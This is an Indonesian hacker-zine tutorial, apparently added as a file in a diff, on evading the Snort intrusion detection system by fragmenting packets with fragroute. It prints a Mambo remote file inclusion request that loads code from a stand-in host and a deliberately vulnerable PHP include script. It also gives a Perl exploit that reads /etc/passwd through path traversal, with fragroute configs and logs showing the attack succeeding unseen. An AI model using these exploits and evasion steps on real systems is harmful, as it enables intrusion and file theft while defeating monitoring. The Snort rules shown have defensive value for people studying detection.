@@ -1,0 +1,297 @@
+Terbitan Online Kecoak Elektronik
+http://www.kecoak-elektronik.net
+
+===========================================================================
+IP FRAGMENTATION FOR EVADING NIDS
+By : Ph03n1X || phoenix@kecoak-elektronik.net
+===========================================================================
+
+
+Introduction
+------------
+
+IDS pada umumnya bekerja dilayer 2 OSI, ids menggunakan "raw traffic"
+dari proses sniffing kemudian mencocokkannya dengan signature yang
+dibuat oleh seorang admin. Jika ada kecocokan antara signature dengan raw tra
+ffic hasil sniffing paket, ids memberikan alert/peringatan sebagai tanda
+adanya proses intrusi ke sistem.
+
+Seorang attacker dapat memfragmentasi paket IP/TCP menjadi bagian kecil 
+kemudian mengacak paket tersebut secara random untuk dikirim ke server 
+target, sedangkan server yang menjadi destination harus bertanggung jawab
+dalam proses reassembly paket. Tentu saja dengan cara seperti ini attack
+er dapat melewati monitoring ids karena tidak ada kecocokan pola packet
+dengan signature ids.
+
+Requirements
+-------------
+
+Pada tulisan ini penulis menggunakan dua buah mesin unix, mesin A adalah 
+mesin attacker beralamat 172.16.11.234 dilengkapi dengan "fragroute" dan 
+mesin T adalah mesin target yang beralamat 172.16.11.103 dilengkapi dengan 
+NIDS "snort" versi 2.6.0
+
+IP Fragmentation Attack
+------------------------
+
+Penulis menggunakan sebuah contoh melewati ids yang memfilter attacking
+terhadap hole mambo index.php remote file inclussion untuk menjelaskan
+IP fragmentation attack. Berikut request HTTP untuk mengexploitasi hole
+pada mambo website :
+
+GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=
+&mosConfig_absolute_path=http://evilcode.com/inject.txt?
+
+(Advisory hole mambo di http://secunia.com/advisories/18935/)
+
+
+Sebuah rule snort dibuat untuk mendeteksi adanya attacking menggunakan 
+hole mambo diatas. Berikut ini file rule.conf yang digunakan :
+
+var HTTP_SERVER 172.16.11.103
+alert tcp any any -> $HTTP_SERVER 80 (content: "index.php?_REQUEST=\
+[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=\
+http\://"; msg: "Attacking Website Using Remote File Inclussion in Mamboo";)
+
+Jalankan snort dengan mode IDS untuk mendeteksi adanya malicious request
+
+#snort -d -c rule.conf &
+
+Saat seorang attacker merequest webserver dengan malicious request untuk meng
+ekploitasi mambo, snort akan segera memberikan peringatan berikut:
+
+#tail -f /var/log/snort/alert
+
+[**] [1:0:0] Attacking Website Using Remote File Inclussion in Mamboo [**]
+[Priority: 0]
+08/11-13:31:41.222444 172.16.11.234:7205 -> 172.16.11.103:80
+TCP TTL:64 TOS:0x10 ID:3625 IpLen:20 DgmLen:181 DF
+***AP*** Seq: 0xAB4A2BB9  Ack: 0x9F5B3AE0  Win: 0x4000  TcpLen: 32
+TCP Options (3) => NOP NOP TS: 1886825653 577596608
+
+
+Snort memberikan warning karena adanya kesamaan pola request HTTP dengan
+rule yang digunakan oleh snort. Lalu bagaimana cara menghindari monitoring
+snort?. Untuk menghindarinya seorang attacker dapat mengacak pola request
+yang dikirim ke server. Salah satu cara yang bisa digunakan adalah dengan 
+memfragmentasi paket IP dan/atau TCP kemudian mengirimkannya secara acak 
+kepada target. Snort tidak mendeteksi adanya attacking karena tidak ada 
+kesamaan pola request dengan rule. Sistem target harus bertanggung jawab 
+dalam proses reassembly paket dan menjawab request attacker, sehingga attacker
+dapat mengexploitasi target tanpa terdeteksi oleh snort. Penulis mengguna
+kan fragroute untuk mengirimkan request HTTP terfragmentasi ke target dengan 
+rule frag.conf berikut :
+
+ip_frag 8
+order random
+print
+
+Rule diatas digunakan untuk memecah/memfragmentasi data dalam paket IP men
+jadi 8 bytes dan mengirimkan fragmen - fragmen paket IP tersebut secara
+acak kepada target. Untuk lebih jelasnya bagaimana membuat rule fragroute 
+silakan dibaca manualnya. (rule "print" tidak berhubungan dalam proses pe
+ngiriman paket IP hanya untuk mencetak proses fragroute ke stdout). Jalan
+kan fragroute di mesin attacker dengan target mesin 172.16.11.103.
+
+#./fragroute -f frag.conf 172.16.11.103
+
+Dengan menggunakan rule fragroute diatas paket data yang dikirim dalam frag
+men - fragmen paket sebagai berikut : (Analisis paket menggunakan ethereal)
+
+Original request
+
+GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=
+&mosConfig_absolute_path=http://evilcode.com/inject.txt?
+
+Karena aturan di rule fragroute memfragmentasi paket menjadi 8 bytes request
+menjadi :
+
+GET /ind   ex.php?_   REQUEST[   option]=   com_cont   ent&_REQ   USET[Ite
+--------   --------   --------   --------   --------   --------   --------
+ frag-1     frag-2     frag-3     frag-4     frag-5     frag-6     frag-7
+
+
+mid]=1&G   LOBALS=&   mosConfi   g_absolu   te_path=   http://e   vilcode.
+--------   --------   --------   --------   --------   --------   --------
+ frag-8     frag-9    frag-10    frag-11    frag-12    frag-13    frag-14
+
+
+com/inje   ct.txt?
+--------   -------
+frag-15    frag-16
+
+
+Kemudian karena rule fragroute "order random", paket IP yang terfragmentasi 
+tadi dikirim secara acak sehingga berbeda sekali dengan request aslinya.Se
+telah dirandom, berdasar analisis ethereal paket IP yang dikirim menjadi seba
+gai berikut :
+
+
+ex.php?_   te_path=   mid]=1&G   mosConfi   ct.txt?    UEST[Ite   g_absolu
+--------   --------   --------   --------   -------    --------   ---------
+ frag-1     frag-2     frag-3     frag-4     frag-5     frag-6     frag-7
+
+
+option]=   LOBALS=&   http://e   com_cont   vilcode.   ent&_REQ   GET /ind
+--------   --------   --------   --------   --------   --------   --------
+ frag-8     frag-9    frag-10    frag-11    frag-12    frag-13    frag-14
+
+
+REQUEST[   com/inje
+--------   --------
+frag-15    frag-16
+
+
+Okee... deghh kalo contoh diatas mungkin masih cukup mengambang, apalagi
+Jika web attacking dilakukan lewat browser, dimungkinkan attacking ga 
+akan jalan jika paket IP di fragmentasi. Untuk menyederhanakan pemahaman
+Web attacking dengan IP fragmentasi untuk melewati ids, berikut sebuah
+PoC sederhana local file inclussion menggunakan socket perl :
+
+TARGET
+-------
+
+TARGET WEB BER IP 172.16.11.234
+Vulnerable File http://172.16.11.234/test/cmd.php
+
+cmd.php seperti berikut :
+
+<?php
+        ini_set('allow_url_fopen', 'on');
+        if(isset($_GET['cmd'])){
+                $cmd=$_GET['cmd'];
+                include "$cmd";
+        }else{
+                echo "cmd isn't set\n";
+        }
+?>
+
+
+Mal Request Untuk ngedapetin /etc/passwd
+http://172.16.11.234/test/cmd.php?cmd=../../../../../../../../../../etc/passwd
+
+Snort Rule :
+
+include classification.config
+preprocessor frag2
+alert tcp any any -> $HTTP_SERVERS 80 (content: "/etc/passwd"; msg: "/etc/passwd inclussion";\
+classtype:attempted-admin; flow:established,to_server; rev:8;)
+
+ATTACKER
+---------
+
+ATTCKER IP 172.16.11.119
+
+Socket exploits pake perl sebagai berikut xplo.pl
+#!/usr/bin/perl -w
+print "PoC Evading NIDS via socket\n";
+
+if(!$ARGV[0])
+{
+  print "Xplo Code by Ph03n1X || http://kecoak-elektronik.net/\n";
+  print "Gunakan : $0 <target>\n\n";
+  exit;
+}
+
+use IO::Socket;
+$server = $ARGV[0];
+$socket = new IO::Socket::INET(
+Proto => "tcp",
+PeerAddr => $server,
+PeerPort => "80",
+);
+
+print $socket "GET /test/cmd.php?cmd=../../../../../../../../../../etc/passwd\r\nHTTP/1.1\r\nHost: $server\r\n\r\n\r\n";
+while ( <$socket> ){
+  print;
+}
+close $socket;
+
+
+A. Attacking tanpa fragmentasi IP
+
+ATTACKER
+---------
+
+[novice@attacker]$ perl xplo.pl 172.16.11.234
+PoC Evading NIDS via socket
+root:*:0:0:Charlie &:/root:/bin/bash
+daemon:*:1:1:The devil himself:/root:/sbin/nologin
+operator:*:2:5:System &:/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
+smmsp:*:25:25:Sendmail Message Submission Program:/nonexistent:/sbin/nologin
+popa3d:*:26:26:POP3 Server:/var/empty:/sbin/nologin
+sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
+uucp:*:66:1:UNIX-to-UNIX Copy:/var/spool/uucppublic:/usr/libexec/uucp/uucico
+www:*:67:67:HTTP Server:/var/www:/sbin/nologin
+named:*:70:70:BIND Name Service Daemon:/var/named:/sbin/nologin
+proxy:*:71:71:Proxy Services:/nonexistent:/sbin/nologin
+nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
+(edited n cencored by author)
+[novice@attacker]$
+
+TARGET
+-------
+
+# tail -f /var/log/snort/alert
+[**] [1:0:8] /etc/passwd inclussion [**]
+[Classification: Attempted Administrator Privilege Gain] [Priority: 1]
+11/05-16:32:31.870052 172.16.11.119:33529 -> 172.16.11.234:80
+TCP TTL:64 TOS:0x0 ID:47591 IpLen:20 DgmLen:151 DF
+***AP*** Seq: 0x8ECD818F  Ack: 0xFC1975FA  Win: 0x5B4  TcpLen: 32
+TCP Options (3) => NOP NOP TS: 87046254 1680097719
+
+B. Attacking Menggunakan Fragmentasi Request
+Pada teknik berikut yang difragmentasi adalah paket TCP, 
+
+ATTACKER DI WINDOW 1
+---------------------
+
+[root@komputer19 fragroute-1.2]#cat f.conf
+tcp_seg 8
+order random
+print
+[root@komputer19 fragroute-1.2]# ./fragroute -f f.conf 172.16.11.234
+fragroute: tcp_seg -> order -> print
+
+Buka console baru
+
+ATTACKER DI WINDOW 2
+---------------------
+
+[novice@komputer19 google]$ perl xplo.pl 172.16.11.234
+PoC Evading NIDS via socket
+root:*:0:0:Charlie &:/root:/bin/bash
+daemon:*:1:1:The devil himself:/root:/sbin/nologin
+operator:*:2:5:System &:/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
+smmsp:*:25:25:Sendmail Message Submission Program:/nonexistent:/sbin/nologin
+popa3d:*:26:26:POP3 Server:/var/empty:/sbin/nologin
+sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
+uucp:*:66:1:UNIX-to-UNIX Copy:/var/spool/uucppublic:/usr/libexec/uucp/uucico
+www:*:67:67:HTTP Server:/var/www:/sbin/nologin
+named:*:70:70:BIND Name Service Daemon:/var/named:/sbin/nologin
+proxy:*:71:71:Proxy Services:/nonexistent:/sbin/nologin
+nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
+(edited n cencored by author)
+[novice@attacker]$
+
+TARGET
+-------
+
+# tail -f /var/log/snort/alert
+(kosong tidak ada alert)
+
+Nah..., dengan teknik mengacak paket, ids bisa dihindari dan masih ada 
+beberapa teknik lain lagi yang bisa digunakan untuk menghindari ids namun
+itu tugas anda untuk mencari referensi jika anda memang serius belajar
+kemanan sistem komputer.
+
+Reference
+----------
+
+1. http://www.sans.org/resources/idfaq/fragroute.php
+2. http://seclists.org/lists/security-basics/2005/Apr/0015.html
+3. http://www.monkey.org/~dugsong/fragroute/fragroute.8.txt
+4. http://www.securityfocus.com/infocus/1577
+5. Snort Documentation di http://snort.org
